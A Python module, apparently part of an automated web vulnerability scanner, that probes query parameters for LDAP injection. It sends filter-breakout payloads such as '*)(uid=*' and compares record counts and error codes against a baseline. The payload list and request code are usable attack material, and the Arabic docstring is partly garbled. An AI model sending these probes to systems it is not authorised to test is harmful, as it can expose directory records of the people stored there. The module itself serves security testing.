"""
LDAP Injection Skill (CWE-90)
=============================
اختبار حقن LDAP بإثبات تفاضلي قطعي:

- baseline: قيمة عادية (e.g. testUser) في بارامتر search/user/filter
- probe: حقن wildcard '&' قاطع + قوالب LDAP filter injection
- Proof-of-Execution: تفاضل قطعي واحد أو أكثر:
    * عدد/حجم نتائج بحث يزيد بجوهري مع '*' (wildcard escape نفيد)
    * تغير حالة الاستجابة (200 ↔ 400/500) مع قيم ليتال (') التي تجيز syntax الأصلي
    * ظهور حقول غير موجودة في baseline (email/phone/dn) تعتزّ بظهور نتائج جديدة
- Reflection-only أو إنهاء بحساب المحتوى العادي → لا يُرفع claim
"""
from __future__ import annotations

import re
from typing import Optional
import httpx
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from agents.skills.base_skill import BaseSkill, SkillResult

LDAP_PARAM_CANDIDATES = ("user", "search", "filter", "dn", "cn", "uid", "mail", "name", "group")
LDAP_PROBES = [
    "*)(uid=*",        # filter wildcard breakout — يفتح النتائج كلياً
    "*\")(uid=*",      # double-quote variant لبعض Backends
    "a*::*",           # broken syntax escape — قد تلقى 500
    "*)(objectClass=*",
    "*)(|(uid=*",
]


class LDAPInjectionSkill(BaseSkill):
    name = "ldap_injection_skill"
    vuln_type = "ldap_injection"
    cwe = "CWE-90"
    owasp_top10 = "A03:2021"
    default_severity = "High"

    # حقول تدور في LDAP tree فتدل على نتائج إضافية منطقية
    RESULT_RECORD_MARKERS = ("mail", "sn=", "dn:", "ou=", "cn=", "telephone")

    def __init__(self, proxy: Optional[str] = None, timeout: float = 12.0):
        super().__init__(proxy=proxy, timeout=timeout)

    async def run(self, target_url: str, param_name: str, **kwargs) -> SkillResult:
        if not any(kw in param_name.lower() for kw in LDAP_PARAM_CANDIDATES):
            return SkillResult(
                verified=False, vuln_type=self.vuln_type,
                title="Param not an LDAP candidate", severity=self.default_severity,
                endpoint=target_url, param_name=param_name, evidence="")

        async with httpx.AsyncClient(proxies=self.proxy or None, timeout=self.timeout,
                                     follow_redirects=True) as client:
            try:
                # ── Baseline: قيمة آمنة منتظمة ──
                baseline = await self._attempt(client, target_url, param_name, "testUser-nonexistent-4210")
                if baseline is None or baseline.status_code in (403, 429):
                    return self._no(target_url, param_name, "Baseline blocked/unavailable")

                base_status = baseline.status_code
                base_matches = self._count_records(baseline.text)

                for probe in LDAP_PROBES:
                    resp = await self._attempt(client, target_url, param_name, probe)
                    if resp is None or resp.status_code in (403, 429):
                        continue

                    probe_matches = self._count_records(resp.text)

                    # ── إثبات 1: عدد نتائج يزيد جوهرياً مع wildcard ──
                    if probe_matches > base_matches and probe_matches >= 2:
                        return SkillResult(
                            verified=True, vuln_type=self.vuln_type,
                            title=f"LDAP Injection in '{param_name}' — wildcard filter breakout exposes {probe_matches} extra records",
                            severity=self.default_severity,
                            endpoint=target_url, param_name=param_name,
                            payload_used=probe,
                            evidence=(f"baseline records={base_matches}; probe records={probe_matches} "
                                      f"after injecting '{probe}'"),
                            confidence=0.90,
                            tool=self.name,
                            evidence_sources=["LDAPInjectionSkill/WildcardDifferential"])

                    # ── إثبات 2: انهيار syntax يظهر قبل/بعد — يفضح theoretical injection ──
                    if resp.status_code >= 500 and base_status < 500 and len(probe) > 4:
                        return SkillResult(
                            verified=False, vuln_type=self.vuln_type,
                            title=f"Suspected LDAP Sanitization Defect in '{param_name}' (server 5xx on injection syntax) — UNVERIFIED_SIGNAL",
                            severity="Low",
                            endpoint=target_url, param_name=param_name,
                            payload_used=probe,
                            evidence=f"baseline status={base_status}; injection probe status={resp.status_code} (5xx may signal parser defect)",
                            confidence=0.55,
                            tool=self.name,
                            evidence_sources=["LDAPInjectionSkill/ErrorDifferential"])
            except Exception as e:
                return self._no(target_url, param_name, str(e))

        return self._no(target_url, param_name, "No differential LDAP response evidence")

    async def _attempt(self, client: httpx.AsyncClient, target_url: str,
                       param_name: str, value: str) -> Optional[httpx.Response]:
        parsed = urlparse(target_url)
        qs = parse_qs(parsed.query)
        qs[param_name] = [value]
        new_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        try:
            return await client.get(new_url)
        except Exception:
            return None

    def _count_records(self, body: str) -> int:
        """يعدّ الصفحات/سجلات LDAP المعروضة في جسم الاستجابة"""
        cnt = 0
        for marker in self.RESULT_RECORD_MARKERS:
            cnt += len(re.findall(re.escape(marker), body, re.I))
        return cnt

    def _no(self, target_url: str, param_name: str, evidence: str = "") -> SkillResult:
        return SkillResult(
            verified=False, vuln_type=self.vuln_type,
            title="LDAP injection not verified (no differential evidence)",
            severity=self.default_severity,
            endpoint=target_url, param_name=param_name, evidence=evidence)

    def can_handle(self, param_name: str, url: str = "", sample_value: str = "") -> float:
        p = param_name.lower()
        if any(kw in p for kw in LDAP_PARAM_CANDIDATES):
            return 0.8
        return 0.05
